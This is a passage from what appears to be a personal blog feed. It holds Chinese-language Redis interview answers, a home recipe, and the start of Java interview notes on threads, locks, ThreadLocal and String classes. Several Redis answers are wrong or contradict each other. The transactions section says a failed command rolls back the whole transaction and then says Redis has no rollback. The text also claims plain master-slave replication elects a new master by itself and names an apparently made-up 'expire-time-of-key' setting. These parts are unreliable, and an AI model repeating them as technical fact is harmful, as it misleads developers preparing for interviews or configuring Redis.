的优点和缺点是什么？"></a>什么是 Redis？Redis 的优点和缺点是什么？</h3><p>Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它提供了高效的键值对数据存储和访问，支持多种数据结构（如字符串、哈希、列表、集合、有序集合等），具有快速、高效、灵活和可扩展的特点，被广泛应用于缓存、消息队列、分布式锁、计数器、数据持久化、实时数据处理等领域。</p><p>Redis 的优点：</p><ol><li>高性能：Redis 的数据存储在内存中，读写速度非常快，特别适合处理大量的高并发请求。</li><li>多种数据类型：Redis 支持多种数据结构，如字符串、哈希、列表、集合、有序集合等，能够满足不同场景下的数据存储需求。</li><li>持久化支持：Redis 支持两种持久化方式，RDB 和 AOF，可以将数据写入磁盘，以便在服务器重启后进行恢复。</li><li>分布式支持：Redis 提供了多种分布式方案，如主从复制、哨兵模式和集群模式等，可以提高系统的可用性和可扩展性。</li><li>丰富的特性：Redis 还提供了诸如 Lua 脚本、事务、过期时间、发布订阅等高级特性，可以帮助开发人员更好地处理数据。</li></ol><p>Redis 的缺点：</p><ol><li>内存限制：Redis 的数据存储在内存中，如果存储的数据量过大，可能会导致内存不足。</li><li>单线程模型：Redis 的主线程是单线程的，可能会存在性能瓶颈。</li><li>数据持久化写入磁盘效率不高：Redis 的持久化写入磁盘的效率不如直接写入内存。</li><li>不支持事务的回滚：Redis 支持事务，但不支持回滚操作。</li></ol><p>总之，Redis 是一款高性能、多功能、可扩展的内存数据存储系统，具有诸多优点和一些缺点，需要根据实际需求和场景进行使用和调优。</p><h3 id="Redis-支持哪些数据类型？各自的应用场景是什么？"><a href="#Redis-支持哪些数据类型？各自的应用场景是什么？" class="headerlink" title="Redis 支持哪些数据类型？各自的应用场景是什么？"></a>Redis 支持哪些数据类型？各自的应用场景是什么？</h3><p>Redis 支持多种数据类型，每种数据类型都有其独特的应用场景，以下是 Redis 支持的数据类型及其应用场景：</p><ol><li>字符串（String）：用于存储字符串、整数、浮点数等简单数据类型，适用于缓存、计数器、计时器等场景。</li><li>哈希（Hash）：用于存储对象，类似于关系型数据库中的表，适用于存储用户信息、商品信息等对象数据。</li><li>列表（List）：用于存储一系列有序元素，支持从列表两端添加、弹出元素，适用于消息队列、任务队列等场景。</li><li>集合（Set）：用于存储一组无序、唯一的元素，支持交、并、差等集合运算，适用于好友列表、标签系统等场景。</li><li>有序集合（Sorted Set）：在集合的基础上，为每个元素分配一个分数，支持按照分数排序和范围查询，适用于排行榜、计数器、地理位置等场景。</li></ol><p>每种数据类型都有其特定的数据结构和命令，Redis 提供了丰富的数据操作命令和高级特性，可以帮助开发人员更好地处理数据，提高系统的性能和可扩展性。</p><h3 id="Redis-的持久化机制有哪些？它们有什么区别？"><a href="#Redis-的持久化机制有哪些？它们有什么区别？" class="headerlink" title="Redis 的持久化机制有哪些？它们有什么区别？"></a>Redis 的持久化机制有哪些？它们有什么区别？</h3><p>Redis 提供了两种持久化机制，分别是 RDB 持久化和 AOF 持久化。</p><ol><li>RDB 持久化：Redis 在指定的时间间隔内将内存中的数据快照写入磁盘，形成一个 RDB 文件，恢复时将 RDB 文件读入内存即可。RDB 持久化的优点是占用磁盘空间小，恢复速度快；缺点是可能会丢失最后一次持久化之后的数据。</li><li>AOF 持久化：Redis 将写命令追加到 AOF 文件中，恢复时将 AOF 文件重新执行一遍即可。AOF 持久化的优点是可以保证数据完整性，因为所有写命令都被记录下来；缺点是文件较大，恢复速度相对较慢。</li></ol><p>两种持久化机制可以结合使用，通过 AOF 持久化保证数据完整性，使用 RDB 持久化进行备份和恢复。在实际使用中，需要根据数据量、系统性能和恢复速度等因素选择合适的持久化机制和参数配置。</p><h3 id="Redis-的过期策略是什么？如何实现定期清理过期键？"><a href="#Redis-的过期策略是什么？如何实现定期清理过期键？" class="headerlink" title="Redis 的过期策略是什么？如何实现定期清理过期键？"></a>Redis 的过期策略是什么？如何实现定期清理过期键？</h3><p>Redis 的过期策略是基于惰性删除和定期删除相结合的方式。</p><p>当一个键过期时，Redis 并不会立即删除它，而是在客户端尝试读取该键时才会检测该键是否过期，如果过期则删除。这种方式称为惰性删除，它的优点是可以减少删除操作的开销和系统负载。</p><p>另外，Redis 会定期扫描一定数量的数据库键，删除其中已过期的键，这种方式称为定期删除。Redis 通过配置 <code>hz</code> 参数来控制每秒执行定期删除操作的次数，默认为 10 次。同时，Redis 还会为每个键设置一个随机的过期时间，防止过多的键同时到达过期时间导致大量的定期删除操作。</p><p>实现定期清理过期键的过程由 Redis 的服务器进程自动完成，其具体实现是通过 Redis 内部的定时器来触发定期删除操作。每次定期删除操作会扫描一定数量的过期键，并将它们从数据库中删除。</p><p>需要注意的是，定期删除操作不一定会及时清理过期键，因此在某些情况下，即使一个键已过期，它仍然可能存在于数据库中。如果需要确保过期键能够及时清理，可以将过期时间设置为较短的时间，并调整 Redis 的定期删除参数来加速清理过期键。</p><h3 id="Redis-支持分布式吗？如何实现分布式？"><a href="#Redis-支持分布式吗？如何实现分布式？" class="headerlink" title="Redis 支持分布式吗？如何实现分布式？"></a>Redis 支持分布式吗？如何实现分布式？</h3><p>是的，Redis 支持分布式，可以通过 Redis Cluster 或者 Redis Sentinel 实现分布式。</p><ol><li>Redis Cluster</li></ol><p>Redis Cluster 是 Redis 的分布式解决方案，它将多个 Redis 节点组成一个集群，提供了数据分片和高可用性等功能。Redis Cluster 使用哈希槽的方式来对数据进行分片，并使用 Gossip 协议来实现节点间的信息传递和故障检测。当一个节点宕机时，集群会自动将该节点的哈希槽迁移到其他节点上。</p><ol><li>Redis Sentinel</li></ol><p>Redis Sentinel 是 Redis 的高可用性解决方案，它通过监控 Redis 节点的运行状态来实现自动故障转移和自动恢复。Redis Sentinel 由多个 Sentinel 节点组成，每个 Sentinel 节点会周期性地检测 Redis 节点的状态，并将状态信息广播给其他 Sentinel 节点。当一个 Redis 节点宕机时，Sentinel 会自动将该节点的服务迁移到其他可用节点上。</p><p>实现分布式的具体步骤如下：</p><ol><li>安装 Redis Cluster 或者 Redis Sentinel。</li><li>配置 Redis 节点，并启动 Redis 服务。</li><li>在 Redis 配置文件中指定集群的名称、节点 IP 地址、端口号等信息。</li><li>创建 Redis 集群或者 Sentinel 集群。</li><li>对于 Redis Cluster，使用命令 <code>CLUSTER MEET</code> 将节点加入集群；使用命令 <code>CLUSTER ADDSLOTS</code> 将哈希槽分配给节点。</li><li>对于 Redis Sentinel，使用命令 <code>SENTINEL MONITOR</code> 将节点加入 Sentinel 集群；使用命令 <code>SENTINEL SET</code> 设置监控的 Redis 实例地址和端口号。</li><li>测试分布式集群的功能和性能。</li></ol><p>需要注意的是，在使用 Redis Cluster 或者 Redis Sentinel 时，应该注意配置节点数量和复制因子等参数，以保证数据分片和高可用性的可靠性和性能。</p><h3 id="Redis-的主从复制和哨兵模式有什么区别？如何实现高可用？"><a href="#Redis-的主从复制和哨兵模式有什么区别？如何实现高可用？" class="headerlink" title="Redis 的主从复制和哨兵模式有什么区别？如何实现高可用？"></a>Redis 的主从复制和哨兵模式有什么区别？如何实现高可用？</h3><p>Redis 的主从复制和哨兵模式都是 Redis 高可用性的解决方案，但它们的实现方式和应用场景有所不同。</p><ol><li>主从复制</li></ol><p>主从复制是 Redis 的一种数据复制方式，通过将一个 Redis 节点（主节点）的数据复制到其他多个 Redis 节点（从节点）上，实现数据的备份和读写分离。主节点负责接收和处理客户端请求，从节点复制主节点的数据，并提供只读访问。</p><p>在主从复制中，当主节点宕机或者网络中断时，Redis 会选举一个新的主节点来替代原来的主节点，继续提供服务。主从复制的优点是实现简单，适用于数据量不大、读写比例不高的场景。</p><ol><li>哨兵模式</li></ol><p>哨兵模式是 Redis 的另一种高可用性解决方案，通过引入多个哨兵节点来监控 Redis 的运行状态，实现自动故障转移和自动恢复。哨兵节点负责检测 Redis 节点的状态，并在主节点宕机或者网络中断时，自动将从节点提升为新的主节点，继续提供服务。</p><p>哨兵模式的优点是实现灵活，可以动态添加和删除节点，并且可以根据实际情况调整故障转移和恢复的参数。哨兵模式适用于数据量较大、读写比例较高、需要实现高可用性和动态扩展的场景。</p><p>实现高可用性的具体步骤如下：</p><ol><li>配置主从复制或者哨兵模式，并启动 Redis 服务。</li><li>配置 Redis 的节点信息、复制因子、监控参数等。</li><li>测试 Redis 的读写性能和数据一致性。</li><li>在哨兵模式下，启动 Sentinel 节点，监控 Redis 的运行状态，并在主节点宕机时，自动完成故障转移和恢复操作。</li></ol><p>需要注意的是，在使用 Redis 主从复制或者哨兵模式时，应该注意节点数量和复制因子等参数，以保证数据一致性和高可用性的可靠性和性能。同时，也需要定期备份和监控 Redis 的数据和运行状态，以便及时发现和处理问题。</p><h3 id="Redis-的并发竞争问题如何解决？"><a href="#Redis-的并发竞争问题如何解决？" class="headerlink" title="Redis 的并发竞争问题如何解决？"></a>Redis 的并发竞争问题如何解决？</h3><p>在 Redis 中，可以通过以下几种方式来解决并发竞争问题：</p><ol><li>使用 Redis 事务机制</li></ol><p>Redis 支持类似数据库的事务机制，可以通过 MULTI、EXEC、WATCH 等命令来实现。在事务中，可以将多个 Redis 命令作为一个整体进行提交，从而保证了这些命令的原子性和一致性。</p><p>在并发环境下，可以使用 Redis 事务机制来保证数据的一致性和避免竞争问题。例如，在对某个键值进行修改时，可以先使用 WATCH 命令监控该键值，然后再使用 MULTI 和 EXEC 命令将修改操作包含在一个事务中进行提交。</p><ol><li>使用 Redis 分布式锁</li></ol><p>Redis 还支持分布式锁机制，可以通过 SETNX、GETSET、EXPIRE 等命令来实现。在分布式环境下，可以使用 Redis 分布式锁来保证资源的独占性和避免竞争问题。例如，在对某个资源进行修改时，可以先获取该资源的锁，然后再进行修改操作，最后释放锁。</p><p>需要注意的是，在使用 Redis 分布式锁时，需要考虑锁的粒度和锁的持有时间等参数，以避免锁的争夺和死锁等问题。</p><ol><li>使用 Redis Lua 脚本</li></ol><p>Redis 还支持 Lua 脚本语言，可以通过 EVAL、EVALSHA 等命令来执行 Lua 脚本。在并发环境下，可以使用 Redis Lua 脚本来实现复杂的操作，并且保证这些操作的原子性和一致性。</p><p>例如，在对某个键值进行修改时，可以使用 Redis Lua 脚本来实现自增、自减、加锁等操作，从而避免竞争问题和数据不一致问题。</p><p>需要注意的是，在使用 Redis Lua 脚本时，需要考虑脚本的性能和安全性等因素，避免出现性能瓶颈和安全漏洞等问题。</p><h3 id="Redis-的事务和乐观锁如何实现？有什么注意点？"><a href="#Redis-的事务和乐观锁如何实现？有什么注意点？" class="headerlink" title="Redis 的事务和乐观锁如何实现？有什么注意点？"></a>Redis 的事务和乐观锁如何实现？有什么注意点？</h3><p>Redis 中的事务和乐观锁可以通过 MULTI、EXEC、WATCH、UNWATCH 等命令来实现。</p><ol><li>Redis 事务</li></ol><p>Redis 中的事务是基于乐观锁实现的，具体的操作流程如下：</p><ul><li>使用 MULTI 命令开启事务。</li><li>在事务中执行多个 Redis 命令。</li><li>使用 EXEC 命令提交事务，Redis 会将事务中的所有命令一次性执行。</li><li>如果事务中有任何一条命令执行失败，整个事务都会被回滚。</li></ul><p>需要注意的是，Redis 的事务不支持回滚操作，如果在事务中出现了错误，整个事务都会被回滚，无法保留已经执行成功的命令。</p><ol><li>Redis 乐观锁</li></ol><p>Redis 的乐观锁机制是基于 WATCH 命令实现的。当一个键被 WATCH 之后，如果该键的值发生了变化，整个事务就会被回滚。具体的操作流程如下：</p><ul><li>使用 WATCH 命令监视一个或多个键。</li><li>开启事务，执行多个 Redis 命令。</li><li>如果监视的键没有被修改，提交事务，Redis 会将事务中的所有命令一次性执行。</li><li>如果监视的键被修改，事务会被回滚。</li></ul><p>需要注意的是，在使用 Redis 的事务和乐观锁时，需要考虑以下几个注意点：</p><ul><li>Redis 的事务和乐观锁都是基于单线程执行的，如果事务中的命令比较多或者执行时间比较长，可能会阻塞其他客户端的请求。</li><li>Redis 的事务和乐观锁只能保证事务中的操作是原子的，无法保证事务之间的隔离性和并发性。</li><li>Redis 的事务和乐观锁都是基于内存实现的，如果 Redis 实例重启或崩溃，可能会丢失部分或全部数据。</li><li>Redis 的 WATCH 命令的性能比较低，如果需要监视的键比较多或者频繁修改，可能会影响性能。</li></ul><h3 id="Redis-的内存淘汰策略有哪些？如何选择合适的策略？"><a href="#Redis-的内存淘汰策略有哪些？如何选择合适的策略？" class="headerlink" title="Redis 的内存淘汰策略有哪些？如何选择合适的策略？"></a>Redis 的内存淘汰策略有哪些？如何选择合适的策略？</h3><p>Redis 的内存淘汰策略有以下几种：</p><ol><li>noeviction</li></ol><p>当 Redis 内存满了之后，不再接受新的写入请求，直接返回错误信息给客户端。</p><ol><li>allkeys-lru</li></ol><p>当 Redis 内存满了之后，从所有的键中选择最近最少使用的数据进行淘汰。</p><ol><li>allkeys-random</li></ol><p>当 Redis 内存满了之后，随机选择一个键进行淘汰。</p><ol><li>volatile-lru</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中选择最近最少使用的数据进行淘汰。</p><ol><li>volatile-random</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中随机选择一个键进行淘汰。</p><ol><li>volatile-ttl</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中选择剩余时间最短的数据进行淘汰。</p><p>选择合适的内存淘汰策略需要根据具体的应用场景来定，一般情况下可以考虑以下几个因素：</p><ol><li>缓存的数据类型和访问模式</li></ol><p>对于一些经常被访问的热点数据，可以选择 allkeys-lru 或 volatile-lru 策略，以保证这些数据的可用性。</p><ol><li>缓存数据的更新频率和过期时间</li></ol><p>对于更新频率较低的数据，可以选择 allkeys-random 或 volatile-random 策略，以避免数据被频繁淘汰。</p><ol><li>缓存数据的重要性和生命周期</li></ol><p>对于一些重要的数据，可以选择 volatile-ttl 策略，以保证这些数据在过期时间短的情况下不被淘汰。</p><p>需要注意的是，Redis 的内存淘汰策略并不是绝对可靠的，一些特殊情况下可能会导致数据被误淘汰，因此在使用 Redis 缓存时需要做好数据备份和容灾工作。</p><h3 id="Redis-的数据淘汰机制是什么？有哪些配置参数？"><a href="#Redis-的数据淘汰机制是什么？有哪些配置参数？" class="headerlink" title="Redis 的数据淘汰机制是什么？有哪些配置参数？"></a>Redis 的数据淘汰机制是什么？有哪些配置参数？</h3><p>Redis 的数据淘汰机制主要是通过内存淘汰策略来实现的，具体介绍可以参考前面的问题回答。</p><p>除了内存淘汰策略，Redis 还提供了一些配置参数来控制数据的淘汰行为，包括以下几个：</p><ol><li>maxmemory</li></ol><p>该参数用于设置 Redis 实例的最大内存限制，当 Redis 内存超过该限制时，会触发内存淘汰机制。</p><ol><li>maxmemory-policy</li></ol><p>该参数用于设置 Redis 实例的内存淘汰策略，包括 noeviction、allkeys-lru、allkeys-random、volatile-lru、volatile-random、volatile-ttl 六种策略，详细介绍可以参考前面的问题回答。</p><ol><li>maxmemory-samples</li></ol><p>该参数用于设置 Redis 内存淘汰策略中随机采样的键数，默认值为 5，建议根据实际情况进行调整。</p><ol><li>maxmemory-policy 其他配置参数</li></ol><p>对于不同的内存淘汰策略，还可以配置一些特定的参数，如：</p><ul><li>volatile-lru 和 allkeys-lru 策略可以通过 lfu-log-factor 参数来设置 LRU 算法的淘汰因子；</li><li>volatile-ttl 策略可以通过 expire-time-of-key 参数来设置过期时间的加权因子；</li><li>volatile-lfu 策略可以通过 hz 参数来设置 LFU 算法的调用频率。</li></ul><p>需要注意的是，配置 Redis 的内存淘汰机制时需要根据实际的业务需求和数据特点进行调整，以达到最优的效果。同时，在使用 Redis 缓存时，也需要注意数据备份和容灾工作，避免数据的丢失或损坏。</p><h3 id="Redis-和关系型数据库的应用场景有什么不同？"><a href="#Redis-和关系型数据库的应用场景有什么不同？" class="headerlink" title="Redis 和关系型数据库的应用场景有什么不同？"></a>Redis 和关系型数据库的应用场景有什么不同？</h3><p>Redis 和关系型数据库的应用场景有一定的区别，主要体现在以下几个方面：</p><ol><li>数据结构和访问方式</li></ol><p>Redis 作为一种基于内存的数据存储服务，支持多种数据结构，如字符串、哈希、列表、集合和有序集合等。相比之下，关系型数据库主要采用表格形式存储数据，支持 SQL 语言进行数据访问和操作。</p><p>Redis 的数据结构具有高效、灵活的特点，适合处理简单、独立、实时性要求高的数据，如计数器、缓存、会话状态等；而关系型数据库则更适合处理数据之间存在关联关系、需要复杂查询和事务支持的应用场景。</p><ol><li>数据容量和持久化</li></ol><p>Redis 的数据存储和计算都在内存中完成，相比之下，关系型数据库通常采用磁盘存储数据，可以处理大量的数据，但同时也需要更多的硬件资源和时间开销。</p><p>另外，Redis 提供了多种持久化机制来保证数据的可靠性和持久化，而关系型数据库通常也支持事务和日志机制来实现数据的持久化和恢复。</p><ol><li>读写性能和扩展性</li></ol><p>由于 Redis 的数据存储和计算都在内存中完成，具有极高的读写性能和响应速度，特别适合处理高并发、低延迟的应用场景。而关系型数据库在高并发场景下通常需要通过增加硬件资源和优化数据库设计来提升性能。</p><p>另外，Redis 支持集群和主从复制等分布式架构，可以实现数据的高可用和扩展性；而关系型数据库通常需要通过分库分表和负载均衡等手段来实现数据的横向扩展。</p><p>综上所述，Redis 和关系型数据库的应用场景有所不同，需要根据实际的业务需求和数据特点进行选择。通常，可以将 Redis 作为缓存、计数器、排行榜等应用的后端数据存储服务，而将关系型数据库作为处理关联关系、事务等复杂数据逻辑的数据存储服务。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜谱</title>
      <link href="/2023/03/02/%E8%8F%9C%E8%B0%B1/"/>
      <url>/2023/03/02/%E8%8F%9C%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<h3 id="擂辣椒茄子皮蛋"><a href="#擂辣椒茄子皮蛋" class="headerlink" title="擂辣椒茄子皮蛋"></a>擂辣椒茄子皮蛋</h3><p>主料：茄子(1个)，皮蛋（2个)，辣椒（看个人，一般两个）</p><p>辅料：蒜，芝麻油</p><p>酱料：老抽（2勺），陈醋（2勺），蚝油（1勺），少量盐</p><p>步骤：</p><ol><li>茄子洗净去皮切成小粗条，放锅上去蒸</li><li>皮蛋剥壳切块</li><li>茄子蒸软后放入碗中</li><li>大蒜切粒</li><li>辣椒洗干净放入锅中加油煎软，撕去表皮</li><li>放放酱料一起捣烂</li></ol>]]></content>
      
      
      <categories>
          
          <category> 菜谱 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 菜谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java面试题</title>
      <link href="/2023/02/26/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/"/>
      <url>/2023/02/26/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h3 id="一、java面向对象有哪些特征？1"><a href="#一、java面向对象有哪些特征？1" class="headerlink" title="一、java面向对象有哪些特征？1"></a>一、java面向对象有哪些特征？1</h3><p>面向对象三大特征：<strong>封装、继承、多态</strong>。封装说明一个类行为和属性于其他类的关系，低耦合、高内聚；继承是父类和子类的关系；多态说的是类与类的关系；</p><p><strong>封装</strong>隐藏了类的内部实现机制，可以在不影响使用的情况下改变类的内部结构，同时也保护了数据。对于外界，他的内部细节是隐藏的，暴露的只是他的访问方法。<strong>属性的封装：</strong>使用者只能通过事先制定好的方法来访问数据，可以方便加入逻辑控制，限制对属性的不合理操作；<strong>方法的封装</strong>：使用者按照既定的方式调用方法，不必关心方法的内部实现，便于使用，增强代码的可维护性；</p><p><strong>继承</strong>是从已有的类中派生出新的类，新的类的数据属性和行为，并能扩展新的能力。子类继承父类，表示子类是一种特殊的父类，并且具有父类所没有的一些方法和属性。从多种实现类中抽出一个基类，使其具备多种实现类的共同特性，当实现类用extends继承了基类（父类）后，实现类就具备了那些相同的属性。当然，父类中通过private定义的变量和方法不会被继承。</p><p>对于<strong>多态</strong>，我更倾向于分为<strong>静态多态</strong>和<strong>动态多态</strong>，静态多态是指在编译时就已经确定的多态，常见的就是<strong>重载</strong>，重载是指两个或者多个函数具有形同的函数名，但参数列表不同，这样就可以根据参数据的不同来区分不同的参数。动态多态是指在运行时才能确定的多态，常见的就是<strong>重写</strong>，重写就是子类重新定义父类的方法，从而使父类方法可以根据不同的对象而具有不同的表达。</p><h3 id="二、java中有哪几种方式来创建线程执行任务？"><a href="#二、java中有哪几种方式来创建线程执行任务？" class="headerlink" title="二、java中有哪几种方式来创建线程执行任务？"></a>二、java中有哪几种方式来创建线程执行任务？</h3><ol><li><h4 id="继承thread类"><a href="#继承thread类" class="headerlink" title="继承thread类"></a>继承thread类</h4><p>重写run方法，new thread方法跑。但是这样占用了当前类的继承名额，使得当前类不能再继承其他类  </p></li><li><h4 id="实现runnable接口"><a href="#实现runnable接口" class="headerlink" title="实现runnable接口"></a>实现runnable接口</h4><p>实现run方法，使用依然用到thread。这种方法更常用，其实thread类底层也是实现了runnable接口。</p><p>也可以通过匿名内部类的方式去生成一个runnable对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>又因为runnable是一个函数式接口（只有一个方法），所以也可以用lamda表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; System.out.println(<span class="string">&quot;hello world&quot;</span>))</span><br></pre></td></tr></table></figure></li><li><h4 id="实现callable接口"><a href="#实现callable接口" class="headerlink" title="实现callable接口"></a>实现callable接口</h4><p>他去执行任务可以拿到任务结果，不过底层也是Runnable</p><p><em>实现Runnable生成对象 =&gt; 传给FutureTask =&gt; 把FutureTask传给Thread =&gt; 启动线程 =&gt;FutureTask用get()方法阻塞式取得结果</em></p><p><em>顺带一提，FutureTask也是实现了Runnable</em></p></li><li><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>底层还是Runnable，从某种层面上来说，全是用Runnable来做的</p></li></ol><h3 id="三、为什么不建议使用Executors来创建线程池"><a href="#三、为什么不建议使用Executors来创建线程池" class="headerlink" title="三、为什么不建议使用Executors来创建线程池"></a>三、为什么不建议使用Executors来创建线程池</h3><p>Executors创建线程池底层采用的是无界阻塞队列，当线程数一定但是任务很多时，会将任务不断的塞入队列中，直到耗尽内存导致<strong>OOM</strong>（内存溢出）</p><p>而且Executors也不能自定义线程的名字，不利于监控线程和排查问题。更建议使用<strong>ThreadPoolExecutor</strong>，他可以灵活控制线程</p><h3 id="四、线程池有哪几种状态？分别表示什么？"><a href="#四、线程池有哪几种状态？分别表示什么？" class="headerlink" title="四、线程池有哪几种状态？分别表示什么？"></a>四、线程池有哪几种状态？分别表示什么？</h3><ol><li><h4 id="RUNNING"><a href="#RUNNING" class="headerlink" title="RUNNING"></a>RUNNING</h4><p>表示线程池正常运行，<strong>既能接受新任务，也可以处理队列中的任务</strong></p></li><li><h4 id="SHUTDOWN"><a href="#SHUTDOWN" class="headerlink" title="SHUTDOWN"></a>SHUTDOWN</h4><p>当调用线程池的<strong>shutdown()</strong>方法时，线程池就会进入SHUTDOWN状态。<strong>此时线程池不会接受新的任务，但是会把队列中的任务处理完</strong></p></li><li><h4 id="STOP"><a href="#STOP" class="headerlink" title="STOP"></a>STOP</h4><p>当调用线程池中的<strong>shutdownnow()</strong>方法时，线程池就会进入STOP状态（停止状态），<strong>此状态下，线程池既不会接受新任务，也不会处理队列中的任务，并且正在运行的线程也会直接中断</strong></p></li><li><h4 id="TIDYING"><a href="#TIDYING" class="headerlink" title="TIDYING"></a>TIDYING</h4><p>线程池中没有线程运行后，线程池的状态会自动进入TIDYING，并调用<strong>terminated()</strong>方法，该方法为空方法，可以进行扩展</p></li><li><h4 id="TERMINATED"><a href="#TERMINATED" class="headerlink" title="TERMINATED"></a>TERMINATED</h4><p>terminated()方法执行完后，状态也成了TERMINATED</p><p>​</p></li></ol><h3 id="五、Sychronized和ReentrantLock有哪些不同？"><a href="#五、Sychronized和ReentrantLock有哪些不同？" class="headerlink" title="五、Sychronized和ReentrantLock有哪些不同？"></a>五、Sychronized和ReentrantLock有哪些不同？</h3><div class="table-container"><table><thead><tr><th style="text-align:center">sychronized</th><th style="text-align:center">ReentrantLock</th></tr></thead><tbody><tr><td style="text-align:center">java中的关键字</td><td style="text-align:center">JDK提供的一个类</td></tr><tr><td style="text-align:center">自动加锁与释放锁</td><td style="text-align:center">需手动加锁与释放锁</td></tr><tr><td style="text-align:center">JVM层面的锁</td><td style="text-align:center">API层面的锁</td></tr><tr><td style="text-align:center">锁的是对象，信息保存在对象头中</td><td style="text-align:center">int类型的state标识标识锁的状态</td></tr><tr><td style="text-align:center">底层有锁升级过程</td><td style="text-align:center">无锁升级过程</td></tr><tr><td style="text-align:center">非公平锁</td><td style="text-align:center">非公平锁或公平锁</td></tr></tbody></table></div><h3 id="六、ThreadLocal有哪些场景？底层是如何实现的？"><a href="#六、ThreadLocal有哪些场景？底层是如何实现的？" class="headerlink" title="六、ThreadLocal有哪些场景？底层是如何实现的？"></a>六、ThreadLocal有哪些场景？底层是如何实现的？</h3><ol><li>ThreadLocal是java中提出的线程本地储存机制，可以利用该机制<strong>将数据缓存在某个线程内</strong>，该线程可随时采用任意方法获取缓存的线程</li><li>ThreadLocal底层通过ThreadLocalMap来实现的，每个<strong>Thread对象</strong>（不是ThreadLocal对象）都存在一个ThreadLocalMap中，Map的key是ThreadLocal对象，value是需要缓存的值</li><li>特别注意，如果在线程池中使用ThreadLocal会导致<strong>内存泄漏</strong>，因为当ThreadLocal对象使用完后，应把设置的key、value即Entry对象回收，但线程池中的线程没有回收，且线程对象是通过强引用指向ThreadLocalMap，而ThreadLocalMap也是通过强引用指向Entry对象。线程没有回收就代表Entry对象没有回收，从而导致内存泄漏。<strong>解决方法：</strong>在使用了ThreadLocal对象之后，手动调用ThreadLocal的remove()方法手动消除Entry对象</li><li>TreadLocal常用于连接管理，不太常用</li></ol><h3 id="七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？"><a href="#七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？" class="headerlink" title="七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？"></a>七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？</h3><p>首先，无论公平锁还是非公平锁，他们的底层都是使用AQS来进行排队，他们的区别在于线程使用lock()方法加锁时</p><ol><li>如果是公平锁，会先检车AQS队列中是否存在线程在排队，如果有就也进行排队</li><li>如果是非公平锁，则不会检查是否有线程排队，而是直接去竞争</li></ol><p>此外，无论是非公平锁还是公平锁，一旦没拿到锁，都会进行排队，当释放锁时，都是唤醒最前面的线程。所以非公平锁只是体现在线程加锁阶段，而没有体现在唤醒阶段。<strong>ReentrantLock也是可重入锁，不论是公平还是非公平，都是可重入锁</strong>（即同一个线程可连续重复加同一把锁）</p><h3 id="八、Sychronized的锁升级过程"><a href="#八、Sychronized的锁升级过程" class="headerlink" title="八、Sychronized的锁升级过程"></a>八、Sychronized的锁升级过程</h3><ol><li><strong>偏向锁：</strong>在锁对象的对象头中记录下当前获取到该锁的线程ID，该线程下次如果又来获取，该锁就可以直接被获取，也就是支持锁重入</li><li><strong>轻量级锁：</strong>由偏向锁升级而来，当一个线程获取到锁后，此时这把锁就是偏向锁。但是此时如果有第二把锁来竞争，偏向锁就会升级为轻量级锁。之所以叫轻量级锁，就是为了和重量级锁区分开来。轻量级锁的底层是通过自旋来实现的，不会阻塞线程</li><li>如果自旋次数过多却仍然没获得锁，则会升级为重量级锁，重量级锁会导致线程阻塞</li><li><strong>自旋锁：</strong>当一个线程尝试获取某个锁时，如果该锁被其他线程占用，就一直循环检测锁是否被释放，而不是进入线程挂起或者睡眠状态。具体就是通过CAS获取预期的一个标记，如果没有获取到，则继续循环获取。如果获取到了，则表示获取到这个锁。<strong>自旋锁不会阻塞线程</strong></li></ol><h3 id="九、字节流与字符流的区别"><a href="#九、字节流与字符流的区别" class="headerlink" title="九、字节流与字符流的区别"></a>九、字节流与字符流的区别</h3><h3 id="十、JDK、JRE、JVM之间的区别"><a href="#十、JDK、JRE、JVM之间的区别" class="headerlink" title="十、JDK、JRE、JVM之间的区别"></a>十、JDK、JRE、JVM之间的区别</h3><ol><li>JDK是JAVA标准开发包，提供了编译运行java程序所需的各种工具（比如编译器javac）和资源</li><li>JRE是java运行环境，用于运行java字节码文件（.class），JRE包括JVM和JVM工作所需类库。普通用户只需要安装JRE跑程序，开发者则需要JDK来编译调试</li><li>JVM是java虚拟机，JRE的一部分，是整个java实现跨平台的关键，负责运行字节码文件</li></ol><h3 id="十一、String、StringBuffer、StringBuild的区别"><a href="#十一、String、StringBuffer、StringBuild的区别" class="headerlink" title="十一、String、StringBuffer、StringBuild的区别"></a>十一、String、StringBuffer、StringBuild的区别</h3><p><strong>string</strong>是常量，不可变，如果尝试修改string，会新生成一个字符串对象。<strong>stringbuffer</strong>和<strong>stringbuilder</strong>可修改，但是stringbuffer是线程安全的，stringbuilder线程不安全，底层没有锁机制，但是速度相对更快</p><h3 id="十二、泛型中extends和super的区别"><a 